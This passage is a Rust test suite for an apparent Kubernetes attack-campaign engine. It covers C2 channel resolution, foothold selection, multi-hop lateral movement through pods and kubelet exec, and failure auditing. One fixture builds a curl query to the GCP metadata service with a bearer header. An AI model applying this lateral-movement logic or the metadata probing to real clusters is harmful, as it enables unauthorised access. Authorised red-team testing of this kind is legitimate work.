use std::collections::HashMap;

use armory::{Armory, Procedure, Ttp, TtpParam};
use c2::{ExecTtp, TtpExecuted, BUILTIN_C2_ID};
use ran_domain::{
    AccessLevel, C2Server, Container, ContainerEscape, Entity, EntityId, K8sCluster, K8sCredential,
    K8sNode, KubeletExecSink, Namespace, OutputTransformKind, Pod, PodExec, RbacPermission,
    RceCanExec, RunsOn, ServiceAccount, SessionInfo, SessionStatus, Uses,
};

use super::{Campaign, ExecChannel, ExecuteActionError, ExecuteActionRequest};

/// Insert a relation directly into the campaign's knowledge graph.
fn push_relation(campaign: &mut Campaign, rel: &dyn ran_domain::Relation) {
    campaign.insert_relation(rel);
}
use crate::failure_analyzers::FAILURE_ANALYZER_EFFECT_ID;
use crate::ParseResult;

fn sample_exec_ttp(target_id: &str, effects: Vec<&str>) -> ExecTtp {
    ExecTtp {
        id: "cmd-1".to_string(),
        ttp: Ttp {
            description: "test".to_string(),
            effects: effects.into_iter().map(str::to_string).collect(),
            procedures: vec![Procedure::new("shell", "env")],
            ..Ttp::new("ttp-test", "Test TTP", "Discovery")
        },
        procedure: Procedure::new("shell", "env"),
        args: HashMap::new(),
        target_id: target_id.to_string(),
        exec_chain: vec![target_id.to_string()],
        exec_system_id: String::new(),
        auth_identity_id: None,
        started_at_ms: 0,
        output_transform: None,
        is_cleanup: false,
        reasoning: String::new(),
    }
}

fn sample_event(stdout: &str) -> TtpExecuted {
    TtpExecuted {
        id: "evt-1".to_string(),
        success: true,
        results: vec![stdout.to_string(), String::new()],
        exit_code: 0,
        fail_reason: String::new(),
        session_connected: None,
    }
}

fn sample_failed_event(fail_reason: &str) -> TtpExecuted {
    TtpExecuted {
        id: "evt-1".to_string(),
        success: false,
        results: vec![fail_reason.to_string()],
        exit_code: 1,
        fail_reason: fail_reason.to_string(),
        session_connected: None,
    }
}

#[test]
fn bootstrap_contains_c2_and_cluster_entities() {
    let campaign = Campaign::bootstrap(
        "Ran",
        K8sCluster::new("dev-cluster")
            .with_context_name(Some("dev-context".to_string()))
            .with_server(Some("https://127.0.0.1:6443".to_string())),
    );

    assert_eq!(campaign.entity_count(), 2);
    assert!(campaign
        .entities
        .contains::<C2Server>(&EntityId::new(BUILTIN_C2_ID)));
    assert!(campaign
        .entities
        .contains::<K8sCluster>(&EntityId::new("k8s/cluster/dev-cluster")));
}

#[test]
fn on_ttp_executed_records_no_parser_audit_for_unknown_effect() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0;
    campaign.entities.insert_typed(pod);

    let cmd = sample_exec_ttp(&target_id, vec!["sys.unknown"]);
    let event = sample_event("X=1\n");

    let processed = campaign.on_ttp_executed(&cmd, &event).unwrap();

    assert_eq!(processed.parse_audits.len(), 1);
    assert!(matches!(
        processed.parse_audits[0].parse_result,
        ParseResult::NoParser
    ));
}

#[test]
fn on_ttp_executed_parses_sys_envvar_into_target_system_info() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0;
    campaign.entities.insert_typed(pod);

    let cmd = sample_exec_ttp(&target_id, vec!["sys.envvar"]);
    let event = sample_event("HOME=/root\nPATH=/usr/bin\n");

    let processed = campaign.on_ttp_executed(&cmd, &event).unwrap();

    assert_eq!(processed.parse_audits.len(), 1);
    assert!(matches!(
        processed.parse_audits[0].parse_result,
        ParseResult::Parsed
    ));

    let target = campaign.get_system_entity(&target_id).unwrap();
    let env_vars = &target.entity().system().env_vars;
    assert_eq!(env_vars.get("HOME"), Some(&"/root".to_string()));
    assert_eq!(env_vars.get("PATH"), Some(&"/usr/bin".to_string()));
}

#[test]
fn on_ttp_executed_marks_exec_pod_running_before_kubelet_source_inference() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));

    let pod = Pod::new("attacker", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let node = K8sNode::new("worker-1");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    let mut sa = ServiceAccount::new("attacker-sa", "default");
    sa.entitlements
        .push(RbacPermission::new("get", "nodes/proxy"));
    campaign.entities.insert_typed(sa);

    let mut cmd = sample_exec_ttp(&pod_id, vec!["k8s.kubelet-exec-source(sys, all(k8s.node))"]);
    cmd.procedure.command = "ran-ws -- ${CMD}".to_string();

    let event = sample_event("ok\n");
    let _processed = campaign.on_ttp_executed(&cmd, &event).unwrap();

    let pod_after = campaign
        .entities
        .find::<Pod>(&EntityId::new(&pod_id))
        .expect("pod should exist after execution");
    assert!(
        pod_after.is_running,
        "successful execution should mark pod as running"
    );

    let has_kubelet_source = campaign
        .graph
        .targets_of(&EntityId::new(&pod_id), "kubelet-exec")
        .iter()
        .any(|id| id.0 == node_id);
    assert!(
        has_kubelet_source,
        "expected kubelet-exec source relation from pod to node"
    );
}

#[test]
fn on_ttp_executed_failure_records_known_failure_audit() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
    let cmd = sample_exec_ttp("ns/default/pod", vec!["sys.envvar"]);
    let event = sample_failed_event(
        "invalid pod target id 'ns/default/pod': expected format ns/<namespace>/pod/<pod-name>",
    );

    let processed = campaign.on_ttp_executed(&cmd, &event).unwrap();

    assert_eq!(processed.parse_audits.len(), 1);
    assert!(matches!(
        processed.parse_audits[0].parse_result,
        ParseResult::KnownFailure
    ));
    assert_eq!(
        processed.parse_audits[0].effect_id,
        FAILURE_ANALYZER_EFFECT_ID
    );
}

#[test]
fn on_ttp_executed_failure_records_unknown_format_when_unclassified() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev-cluster"));
    let cmd = sample_exec_ttp("ns/default/pod/demo", vec!["sys.envvar"]);
    let event = sample_failed_event("something odd happened");

    let processed = campaign.on_ttp_executed(&cmd, &event).unwrap();

    assert_eq!(processed.parse_audits.len(), 1);
    assert!(matches!(
        processed.parse_audits[0].parse_result,
        ParseResult::UnknownFormat
    ));
    assert_eq!(
        processed.parse_audits[0].effect_id,
        FAILURE_ANALYZER_EFFECT_ID
    );
}

// ---------------------------------------------------------------------------
// resolve_exec_channel tests
// ---------------------------------------------------------------------------

fn push_exec_edge(campaign: &mut Campaign, source_id: &str, target_id: &str) {
    push_relation(campaign, &PodExec::new(source_id, target_id));
}

fn push_kubelet_exec_edge(campaign: &mut Campaign, source_id: &str, target_id: &str) {
    push_relation(campaign, &KubeletExecSink::new(source_id, target_id));
}

#[test]
fn resolve_exec_channel_returns_builtin_for_can_exec_relation() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("target", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/some-sa", &target_id);

    let ch = campaign
        .resolve_exec_channel(&target_id)
        .expect("should find channel");
    assert_eq!(ch, ExecChannel::direct(BUILTIN_C2_ID));
}

#[test]
fn resolve_exec_channel_uses_c2_source_backend_from_direct_edge() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("target", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "c2/sliver", &target_id);

    let ch = campaign
        .resolve_exec_channel(&target_id)
        .expect("should find direct c2 backend channel");
    assert_eq!(ch.backend_id, "c2/sliver");
    assert!(ch.hops.is_empty());
}

#[test]
fn resolve_exec_channel_returns_builtin_for_kubelet_pod_exec_relation() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("target", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_kubelet_exec_edge(&mut campaign, "node/node-a", &target_id);

    let ch = campaign
        .resolve_exec_channel(&target_id)
        .expect("should find channel");
    assert_eq!(ch, ExecChannel::direct(BUILTIN_C2_ID));
}

#[test]
fn resolve_exec_channel_returns_via_compromised_intermediate() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // Compromised pod (has exec foothold — C2 can reach it via k8s.can-exec)
    let mut attacker = Pod::new("attacker", "default");
    attacker.system.access_level = AccessLevel::Exec;
    let attacker_id = attacker.entity_id().0.clone();
    campaign.entities.insert_typed(attacker);
    push_exec_edge(&mut campaign, "sa/default/ran", &attacker_id);

    // Target pod (no direct exec edge from C2)
    let target = Pod::new("target", "default");
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);

    // Attacker → target via k8s.can-exec
    push_exec_edge(&mut campaign, &attacker_id, &target_id);

    let ch = campaign
        .resolve_exec_channel(&target_id)
        .expect("should find channel");
    assert_eq!(ch, ExecChannel::via(BUILTIN_C2_ID, &attacker_id));
}

#[test]
fn resolve_exec_channel_finds_path_via_kubelet_source_and_sink() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let mut attacker = Pod::new("entry-hall-pod", "default");
    attacker.system.access_level = AccessLevel::Exec;
    let attacker_id = attacker.entity_id().0.clone();
    campaign.entities.insert_typed(attacker);
    push_exec_edge(&mut campaign, "sa/default/ran", &attacker_id);

    let node = K8sNode::new("cplane-01");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    let target = Pod::new("argocd-application-controller-0", "argocd");
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);

    push_relation(
        &mut campaign,
        &ran_domain::KubeletExecSource::new(&attacker_id, &node_id),
    );
    push_kubelet_exec_edge(&mut campaign, &node_id, &target_id);

    let ch = campaign
        .resolve_exec_channel(&target_id)
        .expect("should resolve through kubelet source + sink chain");

    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(ch.hops, vec![attacker_id.clone(), node_id.clone()]);
    assert!(ch.exec_target_id.is_none());
}

#[test]
fn resolve_exec_channel_multi_hop_bfs() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // p1: compromised pod C2 can exec into (via k8s.can-exec from a non-pod)
    let mut p1 = Pod::new("p1", "default");
    p1.system.access_level = AccessLevel::Exec;
    let p1_id = p1.entity_id().0.clone();
    campaign.entities.insert_typed(p1);
    push_exec_edge(&mut campaign, "sa/default/ran", &p1_id);

    // p2: intermediate pod reachable from p1
    let p2 = Pod::new("p2", "default");
    let p2_id = p2.entity_id().0.clone();
    campaign.entities.insert_typed(p2);

    // p3 (target): reachable from p2
    let p3 = Pod::new("p3", "default");
    let p3_id = p3.entity_id().0.clone();
    campaign.entities.insert_typed(p3);

    push_exec_edge(&mut campaign, &p1_id, &p2_id);
    push_exec_edge(&mut campaign, &p2_id, &p3_id);

    let ch = campaign
        .resolve_exec_channel(&p3_id)
        .expect("should find 2-hop path");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(
        ch.hops,
        vec![p1_id.clone(), p2_id.clone()],
        "hops must be [p1, p2]"
    );
    assert!(ch.exec_target_id.is_none());
}

#[test]
fn resolve_exec_channel_follows_rce_can_exec_edge() {
    // Regression: after lateral movement creates rce.can-exec(entry-hall, redis),
    // subsequent commands targeting redis must succeed via the hop through entry-hall.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // C2 has direct kubectl exec into entry-hall (via k8s.can-exec from a non-pod)
    let entry_hall = Pod::new("entry-hall-xyz", "default");
    let entry_hall_id = entry_hall.entity_id().0.clone();
    campaign.entities.insert_typed(entry_hall);
    push_exec_edge(&mut campaign, "sa/default/ran", &entry_hall_id);

    // Lateral movement established rce.can-exec from entry-hall to redis
    let redis = Pod::new("redis.10-244-1-3", "oopservability");
    let redis_id = redis.entity_id().0.clone();
    campaign.entities.insert_typed(redis);
    push_relation(&mut campaign, &RceCanExec::new(&entry_hall_id, &redis_id));

    let ch = campaign
        .resolve_exec_channel(&redis_id)
        .expect("should find channel via rce.can-exec edge");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(
        ch.hops,
        vec![entry_hall_id],
        "should hop through entry-hall"
    );
    assert!(ch.exec_target_id.is_none());
}

#[test]
fn resolve_exec_channel_prefers_last_foothold_chain_for_follow_up() {
    use crate::execution_record::ExecutionRecord;

    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // entry-hall is a direct foothold.
    let entry = Pod::new("entry-hall", "dungeon");
    let entry_id = entry.entity_id().0.clone();
    campaign.entities.insert_typed(entry);
    push_exec_edge(&mut campaign, "sa/default/ran", &entry_id);

    // redis is target.
    let redis = Pod::new("redis.10-244-1-7", "oopservability");
    let redis_id = redis.entity_id().0.clone();
    campaign.entities.insert_typed(redis);

    // Lateral chain from entry-hall to redis exists.
    push_relation(&mut campaign, &RceCanExec::new(&entry_id, &redis_id));

    // Also inject a direct non-pod edge to redis (can appear from broad
    // inferred permissions), but follow-up should still prefer last foothold.
    push_exec_edge(&mut campaign, "sa/default/other", &redis_id);

    // Most recent command executed on entry-hall.
    campaign.execution_records.push(ExecutionRecord {
        id: "cmd-followup-1".to_string(),
        ttp_id: "x".to_string(),
        ttp_name: "x".to_string(),
        tactic: "Discovery".to_string(),
        target_id: entry_id.clone(),
        exec_system_id: BUILTIN_C2_ID.to_string(),
        auth_identity_id: None,
        procedure_id: "shell".to_string(),
        command: "id".to_string(),
        args: HashMap::new(),
        success: true,
        exit_code: 0,
        results: vec![],
        fail_reason: String::new(),
        started_at_ms: 1,
        completed_at_ms: 2,
        is_cleanup: false,
        reasoning: String::new(),
    });

    let ch = campaign
        .resolve_exec_channel(&redis_id)
        .expect("should resolve follow-up channel");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(
        ch.hops,
        vec![entry_id],
        "follow-up should keep the foothold chain"
    );
}

#[test]
fn resolve_exec_channel_resolves_via_service_account_uses_relation() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // Pod that uses the SA and has a direct exec channel
    let pod = Pod::new("player-pod", "dungeon");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let sa_id = "ns/dungeon/sa/player";
    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);
    push_relation(&mut campaign, &Uses::new(&pod_id, sa_id));

    let ch = campaign
        .resolve_exec_channel(sa_id)
        .expect("should resolve via pod uses SA");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(
        ch.exec_target_id.as_deref(),
        Some(pod_id.as_str()),
        "exec_target_id must be the pod, not the SA"
    );
}

#[test]
fn resolve_exec_channel_errors_when_no_path_in_graph() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("orphan", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);

    let result = campaign.resolve_exec_channel(&target_id);
    assert!(result.is_err(), "expected Err when no exec relations exist");
}

// ---------------------------------------------------------------------------
// resolve_exec_source tests
// ---------------------------------------------------------------------------

#[test]
fn resolve_exec_source_finds_pod_via_can_exec_relation_only() {
    // This is the key regression: entry-hall is accessible via k8s.can-exec but
    // has never had `id` run on it, so access_level is not set.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("entry-hall-xyz", "default");
    let pod_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    // C2 (non-pod) has exec access to the pod.
    push_exec_edge(&mut campaign, "sa/default/ran", &pod_id);

    let ch = campaign
        .resolve_exec_source()
        .expect("should find source via relation");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(ch.exec_target_id.as_deref(), Some(pod_id.as_str()));
}

#[test]
fn resolve_exec_source_prefers_most_recently_used_pod() {
    use crate::execution_record::ExecutionRecord;
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let pod_a = Pod::new("pod-a", "default");
    let pod_b = Pod::new("pod-b", "default");
    let id_a = pod_a.entity_id().0.clone();
    let id_b = pod_b.entity_id().0.clone();
    campaign.entities.insert_typed(pod_a);
    campaign.entities.insert_typed(pod_b);

    push_exec_edge(&mut campaign, "sa/default/ran", &id_a);
    push_exec_edge(&mut campaign, "sa/default/ran", &id_b);

    // Most recent execution was on pod-b
    campaign.execution_records.push(ExecutionRecord {
        id: "cmd-1".to_string(),
        ttp_id: "x".to_string(),
        ttp_name: "x".to_string(),
        tactic: "Execution".to_string(),
        target_id: id_a.clone(),
        exec_system_id: BUILTIN_C2_ID.to_string(),
        auth_identity_id: None,
        procedure_id: "shell".to_string(),
        command: "id".to_string(),
        args: HashMap::new(),
        success: true,
        exit_code: 0,
        results: vec![],
        fail_reason: String::new(),
        started_at_ms: 1,
        completed_at_ms: 2,
        is_cleanup: false,
        reasoning: String::new(),
    });
    campaign.execution_records.push(ExecutionRecord {
        id: "cmd-2".to_string(),
        ttp_id: "x".to_string(),
        ttp_name: "x".to_string(),
        tactic: "Discovery".to_string(),
        target_id: id_b.clone(),
        exec_system_id: BUILTIN_C2_ID.to_string(),
        auth_identity_id: None,
        procedure_id: "shell".to_string(),
        command: "hostname".to_string(),
        args: HashMap::new(),
        success: true,
        exit_code: 0,
        results: vec![],
        fail_reason: String::new(),
        started_at_ms: 3,
        completed_at_ms: 4,
        is_cleanup: false,
        reasoning: String::new(),
    });

    let ch = campaign.resolve_exec_source().expect("should find source");
    assert_eq!(
        ch.exec_target_id.as_deref(),
        Some(id_b.as_str()),
        "should prefer most recently targeted pod"
    );
}

#[test]
fn resolve_exec_source_finds_pod_via_rce_can_exec_transitively() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    // C2 can exec into pod-a.
    let pod_a = Pod::new("pod-a", "default");
    let id_a = pod_a.entity_id().0.clone();
    campaign.entities.insert_typed(pod_a);
    push_exec_edge(&mut campaign, "sa/default/ran", &id_a);

    // pod-a has rce.can-exec to pod-b (lateral movement already done)
    let pod_b = Pod::new("pod-b", "redis");
    let id_b = pod_b.entity_id().0.clone();
    campaign.entities.insert_typed(pod_b);
    push_relation(&mut campaign, &RceCanExec::new(&id_a, &id_b));

    // Both are reachable; without execution history pod-a is returned (first in BFS seed)
    let ch = campaign.resolve_exec_source().expect("should find source");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert!(ch.exec_target_id.is_some());
}

#[test]
fn resolve_exec_source_prefers_direct_foothold_over_transitive_pod() {
    // Regression: if redis is only reachable via entry-hall, lateral movement
    // must still execute FROM entry-hall. Picking redis as a direct source
    // makes BuiltinC2 attempt C2 -> redis directly and fail.
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let entry = Pod::new("entry-hall", "default");
    let entry_id = entry.entity_id().0.clone();
    campaign.entities.insert_typed(entry);
    push_exec_edge(&mut campaign, "sa/default/ran", &entry_id);

    // redis is reachable only through entry-hall, but appears more privileged.
    let mut redis = Pod::new("redis", "default");
    redis.system.access_level = AccessLevel::Exec;
    let redis_id = redis.entity_id().0.clone();
    campaign.entities.insert_typed(redis);
    push_relation(&mut campaign, &RceCanExec::new(&entry_id, &redis_id));

    let ch = campaign
        .resolve_exec_source()
        .expect("should choose a direct foothold source");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(ch.exec_target_id.as_deref(), Some(entry_id.as_str()));
}

#[test]
fn resolve_exec_source_errors_with_no_reachable_pod() {
    let campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    // No pods, no relations
    let result = campaign.resolve_exec_source();
    assert!(result.is_err(), "should fail when no reachable pod exists");
}

#[test]
fn resolve_exec_source_uses_node_as_direct_foothold() {
    // A K8sNode that the C2 can exec into directly (e.g. via kubelet exec)
    // should be returned as a valid lateral-movement source, not ignored.
    use ran_domain::K8sNode;
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let node = K8sNode::new("worker-1");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);
    // Non-system source → node target exec edge.
    push_exec_edge(&mut campaign, "sa/default/ran", &node_id);

    let ch = campaign
        .resolve_exec_source()
        .expect("node should be a valid exec source");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(ch.exec_target_id.as_deref(), Some(node_id.as_str()));
}

#[test]
fn resolve_exec_channel_seeds_include_node_for_dijkstra() {
    // When a Node is a direct foothold seed, Dijkstra should be able to route
    // through it to reach a pod connected via an exec-channel edge.
    use ran_domain::K8sNode;
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let node = K8sNode::new("worker-1");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    let target_pod = Pod::new("victim", "default");
    let target_id = target_pod.entity_id().0.clone();
    campaign.entities.insert_typed(target_pod);

    // C2 → node (direct exec), node → victim pod (exec-channel edge).
    push_exec_edge(&mut campaign, "sa/default/ran", &node_id);
    push_exec_edge(&mut campaign, &node_id, &target_id);

    let ch = campaign
        .resolve_exec_channel(&target_id)
        .expect("should route through node seed to victim pod");
    assert_eq!(ch.backend_id, BUILTIN_C2_ID);
    assert_eq!(
        ch.hops,
        vec![node_id],
        "node should appear as the single hop"
    );
}

// ---------------------------------------------------------------------------
// prepare_action channel resolution tests
// ---------------------------------------------------------------------------

fn minimal_armory(ttp_id: &str) -> Armory {
    Armory::from_ttps(vec![Ttp {
        procedures: vec![Procedure::new("shell", "id")],
        ..Ttp::new(ttp_id, "Test TTP", "Discovery")
    }])
}

fn action_request(target_id: &str, exec_system_id: Option<&str>) -> ExecuteActionRequest {
    ExecuteActionRequest {
        action_id: "test-ttp".to_string(),
        target_id: target_id.to_string(),
        exec_system_id: exec_system_id.map(str::to_string),
        auth_identity_id: None,
        procedure_id: None,
        args: HashMap::new(),
        reasoning: None,
    }
}

#[test]
fn record_preparation_failure_preserves_known_ttp_and_request_context() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let armory = Armory::from_ttps(vec![Ttp::new(
        "test-ttp",
        "Test Preparation Failure",
        "Discovery",
    )]);
    let request = ExecuteActionRequest {
        action_id: "test-ttp".to_string(),
        target_id: "ns/default/pod/demo".to_string(),
        exec_system_id: Some("custom-backend".to_string()),
        auth_identity_id: Some("operator-kubeconfig".to_string()),
        procedure_id: Some("shell".to_string()),
        args: HashMap::from([("Namespace".to_string(), "default".to_string())]),
        reasoning: Some("verify unavailable channel".to_string()),
    };
    let error = ExecuteActionError::NoExecChannel("no route to target".to_string());

    let (record, ttp) = campaign.record_preparation_failure(&request, &armory, &error);

    assert!(record.id.starts_with("cmd-"));
    assert_eq!(record.ttp_id, "test-ttp");
    assert_eq!(record.ttp_name, "Test Preparation Failure");
    assert_eq!(record.tactic, "Discovery");
    assert_eq!(record.target_id, "ns/default/pod/demo");
    assert_eq!(record.exec_system_id, "custom-backend");
    assert_eq!(
        record.auth_identity_id.as_deref(),
        Some("operator-kubeconfig")
    );
    assert_eq!(record.procedure_id, "shell");
    assert_eq!(record.args, request.args);
    assert_eq!(record.reasoning, "verify unavailable channel");
    assert!(record.command.is_empty());
    assert!(!record.success);
    assert_eq!(record.exit_code, -1);
    assert_eq!(record.results, vec!["no route to target"]);
    assert_eq!(record.fail_reason, "no route to target");
    assert_eq!(record.started_at_ms, record.completed_at_ms);
    assert!(!record.is_cleanup);
    assert_eq!(ttp.id, "test-ttp");
    assert_eq!(ttp.name, "Test Preparation Failure");
    assert_eq!(campaign.get_execution_records().len(), 1);
    assert_eq!(campaign.get_execution_records()[0].id, record.id);
    assert!(campaign.get_open_steps().is_empty());
}

#[test]
fn record_preparation_failure_synthesizes_ttp_for_every_error_variant() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let armory = Armory::from_ttps(Vec::new());
    let request = ExecuteActionRequest {
        action_id: "unknown-ttp".to_string(),
        target_id: "unknown-target".to_string(),
        exec_system_id: None,
        auth_identity_id: None,
        procedure_id: None,
        args: HashMap::new(),
        reasoning: None,
    };
    let errors = [
        ExecuteActionError::InvalidInput("invalid input".to_string()),
        ExecuteActionError::NotFound("not found".to_string()),
        ExecuteActionError::NoExecChannel("no channel".to_string()),
        ExecuteActionError::InvariantViolation("invariant violation".to_string()),
    ];

    for (index, error) in errors.iter().enumerate() {
        let expected_reason = match error {
            ExecuteActionError::InvalidInput(reason)
            | ExecuteActionError::NotFound(reason)
            | ExecuteActionError::NoExecChannel(reason)
            | ExecuteActionError::InvariantViolation(reason) => reason,
        };
        let (record, ttp) = campaign.record_preparation_failure(&request, &armory, error);

        assert_eq!(record.fail_reason, *expected_reason);
        assert_eq!(record.results, vec![expected_reason.clone()]);
        assert_eq!(record.ttp_id, "unknown-ttp");
        assert_eq!(record.ttp_name, "unknown-ttp");
        assert!(record.tactic.is_empty());
        assert!(record.exec_system_id.is_empty());
        assert!(record.procedure_id.is_empty());
        assert!(!record.success);
        assert_eq!(record.exit_code, -1);
        assert_eq!(ttp.id, "unknown-ttp");
        assert_eq!(ttp.name, "unknown-ttp");
        assert!(ttp.tactic.is_empty());
        assert_eq!(campaign.get_execution_records().len(), index + 1);
    }

    assert!(campaign.get_open_steps().is_empty());
}

#[test]
fn prepare_action_auto_resolves_channel_from_graph() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &target_id);

    let armory = minimal_armory("test-ttp");
    let exec = campaign
        .prepare_action(action_request(&target_id, None), &armory)
        .expect("should prepare action");

    assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
}

#[test]
fn prepare_action_wraps_hops_using_relation_metadata_and_sets_output_transform() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));

    let mut attacker = Pod::new("entry", "default");
    attacker.system.access_level = AccessLevel::Exec;
    let attacker_id = attacker.entity_id().0.clone();
    campaign.entities.insert_typed(attacker);
    push_exec_edge(&mut campaign, "sa/default/ran", &attacker_id);

    let node = K8sNode::new("worker-1");
    let node_id = node.entity_id().0.clone();
    campaign.entities.insert_typed(node);

    let target = Pod::new("victim", "argocd");
    let target_id = target.entity_id().0.clone();
    campaign.entities.insert_typed(target);

    push_relation(
        &mut campaign,
        &ran_domain::KubeletExecSource::new(&attacker_id, &node_id)
            .with_envelope("ran-ws --token test -- ${CMD}")
            .with_output_transform(OutputTransformKind::JsonEnvelope),
    );
    push_kubelet_exec_edge(&mut campaign, &node_id, &target_id);

    let armory = minimal_armory("test-ttp");
    let exec = campaign
        .prepare_action(action_request(&target_id, None), &armory)
        .expect("should prepare action over kubelet chain");

    assert_eq!(exec.exec_system_id, BUILTIN_C2_ID);
    assert_eq!(exec.exec_chain, vec![attacker_id, node_id, target_id]);
    assert_eq!(
        exec.output_transform,
        Some(c2::OutputTransform::JsonEnvelope),
        "output transform should come from relation metadata"
    );
    assert!(
        exec.procedure.command.contains("ran-ws --token test -- "),
        "outer wrapper should use relation envelope"
    );
    assert!(
        exec.procedure.command.contains("ran-ws --token test -- id"),
        "inner command should be passed through directly for kubelet sink hop"
    );
}

#[test]
fn prepare_action_expands_object_headers_into_multiple_flags() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &target_id);

    let armory = Armory::from_ttps(vec![Ttp {
        params: vec![
            TtpParam {
                name: "URL".to_string(),
                param_type: "string".to_string(),
                description: String::new(),
                required: true,
                default: "https://metadata.google.internal/computeMetadata/v1/project/project-id"
                    .to_string(),
            },
            TtpParam {
                name: "HEADERS".to_string(),
                param_type: "object".to_string(),
                description: String::new(),
                required: true,
                default: "{\"Metadata-Flavor\":\"Google\",\"Authorization\":\"Bearer abc\"}"
                    .to_string(),
            },
        ],
        procedures: vec![Procedure {
            tool: Some("curl".to_string()),
            ..Procedure::new(
                "curl",
                "curl {% for name, value in HEADERS %} -H \"{{ name }}: {{ value }}\" {% endfor %} \"${URL}\"",
            )
        }],
        ..Ttp::new("http-object-headers", "HTTP Object Headers", "Discovery")
    }]);

    let exec = campaign
        .prepare_action(
            ExecuteActionRequest {
                action_id: "http-object-headers".to_string(),
                target_id: target_id.clone(),
                exec_system_id: None,
                auth_identity_id: None,
                procedure_id: Some("curl".to_string()),
                args: HashMap::new(),
                reasoning: None,
            },
            &armory,
        )
        .expect("should prepare action with header collection");

    assert!(
        exec.procedure
            .command
            .contains("-H \"Metadata-Flavor: Google\""),
        "expected metadata header in command: {}",
        exec.procedure.command
    );
    assert!(
        exec.procedure
            .command
            .contains("-H \"Authorization: Bearer abc\""),
        "expected authorization header in command: {}",
        exec.procedure.command
    );
}

#[test]
fn prepare_action_materializes_abstract_http_request_procedure() {
    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
    let pod = Pod::new("demo", "default");
    let target_id = pod.entity_id().0.clone();
    campaign.entities.insert_typed(pod);
    push_exec_edge(&mut campaign, "sa/default/ran", &target_id);

    let mut ttps = curl_armory().ttps().to_vec();
    ttps.push(Ttp {
        procedures: vec![Procedure {
            tool: Some("curl".to_string()),
            http_request: Some(serde_json::json!({
                "method": "POST",
                "url": "https://k8s-api.local/ssrr",
                "headers": {"Authorization": "Bearer abc"},
                "body": "{\"a\":1}",
                "timeout_seconds": 15,
                "use_ca": false,
                "ca_path": ""
            })),
            ..Procedure::new("curl", "")
        }],
        ..Ttp::new("http-abstract", "HTTP Abstract", "Discovery")
    });
    let armory = Armory::from_ttps(ttps);

    let exec = campaign
        .prepare_action(
